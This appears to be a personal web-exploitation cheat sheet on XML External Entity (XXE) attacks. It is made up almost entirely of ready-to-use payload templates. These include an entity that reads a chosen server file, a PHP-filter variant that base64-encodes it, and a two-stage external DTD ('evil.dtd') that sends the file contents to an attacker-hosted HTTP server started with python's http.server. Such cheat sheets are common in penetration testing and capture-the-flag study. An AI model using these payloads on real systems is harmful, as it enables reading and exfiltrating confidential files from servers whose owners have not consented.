---
title: "XXE (XML External Entity)"
date: 2025-7-17
tags: ["Web Exploitation", "XXE", "Xml", "Dtd", "Web", "Remote File Inclusion", "Data Exfiltration", "PHP FIlter", "LFI", "Local File Inclusion"]
---

### XXE Template

```console
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY data SYSTEM "<FILE>">]>
<<TAG>>
    <<TAG1>>&data;</<TAG1>>
</<TAG>>
```

---

### XXE Template (With PHP Filter)

```console
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY data SYSTEM "php://filter/convert.base64-encode/resource=<FILE>">]>
<<TAG>>
    <<TAG1>>&data;</<TAG1>>
</<TAG>>
```

---

### External DTD (2 Stage)

#### 1. Create a evil.dtd

```console
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=<FILE>">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://<LOCAL_IP>:<PORT>/data?%data;'>">
```

#### 2. Host a Server

```console
python3 -m http.server <PORT>
```

#### 2. XXE

```console
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % bar SYSTEM "http://<LOCAL_IP>:<PORT>/evil.dtd">
        %bar;
        %eval;
]>
<<TAG>>
    <<TAG1>>&exfil;</<TAG1>>
</<TAG>>
```
